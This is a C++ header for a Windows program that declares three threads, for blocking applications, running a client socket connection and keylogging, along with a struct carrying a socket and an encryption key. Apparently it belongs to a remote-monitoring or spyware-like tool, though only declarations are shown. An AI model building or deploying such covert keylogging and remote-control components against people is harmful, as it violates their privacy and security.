/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*/

#ifndef THREAD_H_
#define THREAD_H_

#include <ws2tcpip.h>
#include <shellapi.h>
#include <winbase.h>
#include <windef.h>
#include <winsock2.h>
#include <winuser.h>

#include <string>
#include <ctime>
#include <sstream>
#include <fstream>
#include <iterator>
#include <list>

#include "crypto.h"
#include "sharedList.h"

DWORD WINAPI BlockAppsThread(void* arg);
DWORD WINAPI ClientSocketThread(void* arg);
DWORD WINAPI KeyloggerThread(void* arg);

struct ClientSocketArgs {
	SOCKET ClientSocket;
	const char* EncryptionKey;
};

#endif /* THREAD_H_ */
